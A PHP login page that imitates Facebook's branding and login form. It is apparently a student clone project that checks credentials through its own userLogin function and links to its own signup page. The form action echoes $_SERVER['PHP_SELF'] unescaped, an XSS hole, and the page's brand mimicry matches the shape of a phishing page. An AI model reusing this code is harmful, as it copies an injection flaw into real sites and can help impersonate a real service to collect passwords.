<?php 
	include_once "libs/functions.php";
	$faceBook 		= new FacebookMe;

	if( !empty( $_SESSION['imgt'] ) AND !empty($_SESSION['name'])){

		header("location:profile/home.php");

	}


 ?>
 <!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Facebook - log in or sing up</title>
	<link rel="shortcut icon" href="images/fav.png" type="image/x-icon">
	<link rel="stylesheet" href="style.css">
</head>
<body>

	<div class="facebook_login">
		<div class="facebook_logo">
			<img src="images/fb.png" alt="">
		</div>
		<?php 

				if(isset($_POST['login_submit'])){

					$uemail			=  $_POST['uemail'];
					$upassecho 		=  $_POST['upass'];


					if( empty($uemail) OR empty($upassecho )){
						$messages = "<p style='color:red; font-size:14px; font-weight:bold;'>Plasse Set Your User Name AND Passwood</p>";

					}else{

						$user_data_s 	= $faceBook -> userLogin($uemail, $upassecho);

						echo $user_data_s;

					}




				}




		 ?>
		<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
			<div class="facebook_input_box devin">
				<h4>Log in to Facebook</h4>
				<?php if(isset($messages)){echo $messages ;} ?>
				<input name="uemail" type="text" placeholder="Email Address And Phone Number">
				<input name="upass" type="password" placeholder="Password">
				<input name="login_submit" type="submit" value="Login Now">

				<div class="facebook_btn_link">
					<a href="#">Forgotten password?</a>
					<a href="singup.php">Sing Up for Facebook</a>
				</div>
			</div>
		</form>
	</div>
</body>
</html>